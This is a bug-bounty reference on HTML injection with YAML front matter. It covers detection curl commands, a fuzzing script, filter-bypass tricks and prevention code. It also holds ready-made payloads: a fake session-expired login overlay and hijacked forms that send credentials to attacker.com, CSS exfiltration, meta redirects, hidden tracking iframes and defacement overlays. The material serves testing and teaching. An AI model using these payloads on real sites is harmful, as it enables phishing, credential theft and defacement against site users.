---
name: "html-injection"
version: "2.0"
category: "api"
subcategory: "injection"
phase: "exploitation"
tags: ["api", "bug-bounty", "credential-theft", "defacement", "html-injection", "injection", "phishing", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-suite", "curl", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["css-injection", "csrf", "cors-misconfiguration", "xss", "xss-polyglot", "phishing"]
description: "Bug bounty skill: html injection - exploitation phase, api category"
---
# HTML Injection

## Summary

HTML injection occurs when user input is reflected in web pages without proper sanitization, allowing attackers to inject arbitrary HTML tags. Unlike XSS (which executes JavaScript), HTML injection manipulates page structure — enabling phishing forms, defacement, credential theft, and anti-CSRF token exfiltration.

## Key Concepts

- **HTML Injection vs XSS**: HTML injection inserts HTML tags (forms, iframes, images, styling); XSS injects executable JavaScript. They share the same root cause (untrusted input rendered without sanitization) but differ in capability. HTML injection is often a stepping stone to XSS.
- **Reflected HTML Injection**: Payload delivered to each victim individually via a malicious link, becomes part of the request.
- **Stored HTML Injection**: Payload stored on the server (database, profile, comments) and delivered to multiple users later.
- **DOM-based HTML Injection**: Vulnerability exists in client-side JavaScript that dynamically updates the DOM without sanitization.

## Technical Details

### How It Works

1. User input enters the application via a form field, URL parameter, cookie, or header.
2. The website fails to sanitize or escape the input — the malicious HTML is stored/reflected and rendered in the response.
3. When the page loads, the injected HTML renders, modifying appearance, capturing input, or redirecting users.

### Vulnerable Code Example
```php
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>
```
Input `?name=<h1>Injected</h1>` renders as `<div>Welcome, <h1>Injected</h1></div>`.

### Injection Points

- Search bars and search results
- Comment sections, user profile fields
- Contact/feedback/registration forms
- URL parameters reflected on page
- Error messages, page titles, headers
- Cookie values reflected on page
- Hidden form fields

### Common Vulnerable Parameters
```
name, user, search, query, message, title, content, redirect, url, page
```

## Methodology

1. Map all injection surfaces — search bars, comment sections, profile fields, URL parameters, error messages, cookie values reflected on page.
2. Test basic HTML rendering — inject `<h1>Test</h1>`, `<b>Bold</b>`, `<i>Italic</i>`, `<u>Underline</u>`, `<font color="red">Red</font>` and check if tags render in the response.
3. For each confirmed reflection point, determine if it's reflected (per-request), stored (persists across sessions), or DOM-based (client-side rendering).
4. Test structural injection — inject `<div>`, `<p>`, `<br>`, `<font>` to assess the extent of control over the page layout.
5. Test link injection — `<a href="http://attacker.com">Click</a>` — assess phishing capability.
6. Test form injection — `<form action="http://attacker.com/steal"><input name="user"><input type="password" name="pass"><button>Login</button></form>` — assess credential theft risk.
7. Test iframe injection — `<iframe src="http://attacker.com">` — assess content embedding.
8. Test meta tag injection — `<meta http-equiv="refresh" content="0;url=http://attacker.com">` — assess redirect capability.
9. Test CSS injection — `<style>body{display:none}</style>` — assess defacement capabilities.
10. If basic injection is blocked, test bypass techniques — case variations, encoding (HTML entities, URL encoding, double encoding, Unicode), tag splitting, null bytes.
11. Distinguish HTML injection from XSS — test `<script>alert(1)</script>` to see if JavaScript executes (XSS) or only renders as text (HTML injection only).
12. Automate testing — use Burp Intruder with an HTML injection wordlist, or a custom fuzzing script.

## Detection Commands

### Basic HTML injection test
```bash
curl -s "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E" | grep -i "<h1>"
curl -s "http://target.com/welcome?name=%3Cb%3EBold%3C%2Fb%3E" | grep -i "<b>"
```

### Test POST injection
```bash
curl -X POST -d "name=<h1>Injected</h1>&email=test@test.com" \
  -s "http://target.com/register" | grep -i "<h1>"
```

### Automated fuzzing script
```bash
python3 -c "
import requests, urllib.parse

target = 'http://target.com/search'
payloads = [
    '<h1>Test</h1>', '<b>Bold</b>',
    '<img src=x>', '<a href=\"http://evil.com\">Click</a>',
    '<div style=\"color:red\">Styled</div>',
    '<iframe src=\"http://evil.com\"></iframe>'
]
for p in payloads:
    r = requests.get(f'{target}?q={urllib.parse.quote(p)}')
    if p.lower() in r.text.lower():
        print(f'[+] Possible injection: {p}')
"
```

## Exploitation Payloads

### Phishing form injection
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Please log in again.</p>
    <form action="http://attacker.com/capture" method="POST">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</div>
```

### Full page overlay (defacement)
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>Site Under Maintenance</h1>
</div>
```

### Meta redirect
```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
```

### CSP bypass attempt
```html
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

### CSS credential exfiltration
```html
<style>
input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

### CSS injection (exfiltration attempt)
```html
<style>
body { background: url('http://attacker.com/track') }
.content { display: none }
</style>
```

### Form action hijacking
```html
<form action="http://attacker.com/steal">
```

### Image overlay defacement
```html
<img src="http://attacker.com/defaced.jpg"
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
```

### Marquee injection (visible movement)
```html
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### iframe injection
```html
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

## Commands

### URL-encoded phishing link generation
```bash
echo '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;"><h2>Session Expired</h2><form action="http://attacker.com/capture"><input name="user"><input type="password" name="pass"><button>Login</button></form></div>' | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"
```

## Quick Reference

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="evil.com">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="evil.com">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

## Tools

- **Burp Suite** — Repeater, Intruder with HTML injection wordlists
- **OWASP ZAP** — Active scan with HTML injection rules
- **cURL** — Manual payload testing
- **Browser DevTools** — Inspect rendered HTML in real-time
- **Tamper Data** — Browser proxy for interception

## Bypass Techniques

- **Case Variations**: `<H1>`, `<ScRiPt>`
- **HTML Entities**: `&#60;h1&#62;Encoded&#60;/h1&#62;`
- **URL Encoding**: `%3Ch1%3E`, `%253Ch1%253E` (double encoding)
- **Unicode Encoding**: `\u003ch1\u003e`
- **Null Byte**: `<h1%00>Null Byte</h1>`
- **Tag Splitting**: `<h\n1>Split Tag</h1>`
- **Attribute-based**: `<div onmouseover="alert(1)">Hover</div>` (tests for XSS stepping stone)
- **Nested Tags**: Bypass strip_tags() by nesting allowed tags

## Constraints and Limitations

- Modern browsers may sanitize some injections (e.g., `<script>` via `document.write`)
- CSP can prevent inline styles and external resource loading
- WAFs may block common payload patterns
- Some applications escape output properly — verify with encoding bypasses first
- HTML injection alone does not execute JavaScript (that's XSS) — but it enables phishing, defacement, and credential theft

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |

## Not a Finding If

- The application uses `htmlspecialchars()` (PHP), `escape()` (Python), or `textContent` (JS) to encode HTML entities — tags render as text, not rendered HTML
- A CSP header blocks inline content and external resource loading
- WAF blocks HTML tag patterns entirely (verify with encoding bypasses first)
- Input is validated server-side with a strict whitelist approach
- Modern framework (React, Angular, Vue) is used with automatic output encoding and `dangerouslySetInnerHTML` is never used with user data

## Impact

- **Data Theft**: Attackers can steal personal data from users
- **Session Hijacking**: Malicious injected HTML can hijack user sessions
- **Website Defacement**: Injected HTML can alter the appearance or content of a website
- **Anti-CSRF Token Exfiltration**: Hidden input fields containing CSRF tokens can be read via injected HTML
- **Password Manager Credential Theft**: Injected login forms can capture credentials auto-filled by password managers
- **Phishing**: Convincing fake login forms overlay the real page

## Prevention

### Output Encoding
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```
```python
from html import escape
safe_output = escape(user_input)

# Flask/Jinja2: auto-escapes by default with {{ }}
# {{ user_input }} — safe (auto-escaped)
# {{ user_input | safe }} — marks as safe (dangerous with user data!)
```
```javascript
element.textContent = userInput;  // Safe
element.innerHTML = DOMPurify.sanitize(userInput);  // Safe with DOMPurify
```

### Input Validation
- Whitelist allowed characters per field type
- `strip_tags($input, '<p><b><i>')` to allow only specific tags (PHP)

### Framework Protections
- React/Angular/Vue auto-escape by default — avoid `dangerouslySetInnerHTML`, `v-html`, `innerHTML` with user data

## Notes

- HTML injection is often a stepping stone to XSS — test `<img src=x onerror=alert(1)>` to see if the application differentiates between HTML and JS
- Stored HTML injection is higher impact than reflected — it affects all visitors without requiring a malicious link
- CSS injection via `<style>` can be used for data exfiltration using CSS selectors and background URLs
- Modern browsers may sanitize some injections (e.g., `document.write` with `<script>`), but `<form>`, `<iframe>`, `<img>`, and `<a>` tags are often allowed

## References

- https://portswigger.net/web-security/cross-site-scripting
- https://owasp.org/www-community/attacks/HTML_Injection
- https://calico-family-1b4.notion.site/Command-Injection-HTML-injection-2463ceb9662a80b0b36ede47df162605
